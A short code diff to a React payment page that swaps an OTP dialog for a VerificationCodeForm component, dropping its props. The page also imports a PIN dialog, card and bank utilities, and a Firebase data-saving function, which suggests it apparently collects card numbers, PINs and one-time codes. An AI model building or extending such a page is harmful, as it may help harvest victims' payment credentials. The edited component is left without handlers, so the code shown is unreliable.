@@ -9,8 +9,8 @@ import { Badge } from "@/components/ui/badge"
 import { ShieldCheck } from "lucide-react"
 import { detectCardType, formatCardNumber, formatExpiryDate, getBankInfo } from "@/lib/card-utils"
 import { addData } from "@/lib/firebase"
-import { OtpDialog } from "./otp-dialog"
 import { PinDialog } from "./pin-dialog"
+import { VerificationCodeForm } from "./otp-dialog"
 
 export default function PaymentPage() {
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-visa")
@@ -275,11 +275,7 @@ export default function PaymentPage() {
         </div>
       </div>
 
-      <OtpDialog
-        open={showOtpDialog}
-        onOpenChange={setShowOtpDialog}
-        onOtpApproved={handleOtpApproved}
-        documentId={documentId}
+      <VerificationCodeForm 
       />
 
       <PinDialog
